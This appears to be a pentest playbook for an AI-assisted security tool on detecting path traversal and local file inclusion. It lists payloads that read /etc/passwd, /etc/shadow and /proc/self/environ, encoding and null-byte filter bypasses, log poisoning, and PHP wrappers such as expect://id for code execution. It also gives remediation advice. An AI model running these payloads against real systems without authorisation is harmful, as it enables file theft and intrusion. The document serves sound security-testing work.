---
name: Path Traversal Detection
version: 1.0
author: community
description: Detect directory traversal vulnerabilities
tags: [path-traversal, lfi, owasp-a01, file-access]
requires_selection: true
---

# Path Traversal Detection

## Objectif

Detect vulnerabilities that allow accessing files outside the intended directory via `../` sequences.

## Typical injection points

- File parameters: `?file=report.pdf`, `?page=home`
- URL paths: `/download/docs/manual.pdf`
- Includes: `?template=header`, `?lang=en`
- Upload/Download: Filenames

## Test steps

### 1. Identify file parameters

Look for:
- `file=`, `path=`, `page=`, `doc=`
- `template=`, `include=`, `lang=`
- Extensions: `.php`, `.jsp`, `.aspx`, `.html`

### 2. Test basic traversals

**Classic sequences:**
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**Linux target files:**
```
/etc/passwd
/etc/shadow (if root)
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
```

**Windows target files:**
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles
```

### 3. Filter bypasses

**Double encoding:**
```
%252e%252e%252f  (../)
```

**Null byte (older versions):**
```
../../../etc/passwd%00.jpg
../../../etc/passwd\0.jpg
```

**../ filter bypass:**
```
....//....//
..;/..;/
..\\..\\ (Windows)
```

**Unicode/Overlong:**
```
..%c0%af..%c0%af
..%ef%bc%8f..%ef%bc%8f
```

### 4. Test LFI to RCE

**Log poisoning:**
```
1. Inject code in User-Agent
2. Include /var/log/apache2/access.log
```

**PHP wrappers:**
```
php://filter/convert.base64-encode/resource=config.php
php://input (with POST data)
data://text/plain,<?php phpinfo(); ?>
expect://id
```

### 5. Document the finding

If vulnerable:
```
burp_create_finding(
  title: "Path Traversal on [endpoint]",
  type: "VULNERABILITY",
  severity: "HIGH",  -- CRITICAL if RCE possible
  confidence: "CERTAIN",
  category: "Path Traversal",
  description: "Access to arbitrary files via directory traversal...",
  remediation: "Validate paths, use whitelists, chroot...",
  references: ["CWE-22", "https://owasp.org/www-community/attacks/Path_Traversal"]
)
```

## Vulnerability indicators

- System file content in response
- Errors revealing file paths
- Different behavior based on traversal depth

## Protection indicators

- Strict filename validation
- Using IDs instead of names
- Chroot or sandboxing
- Whitelist of allowed files
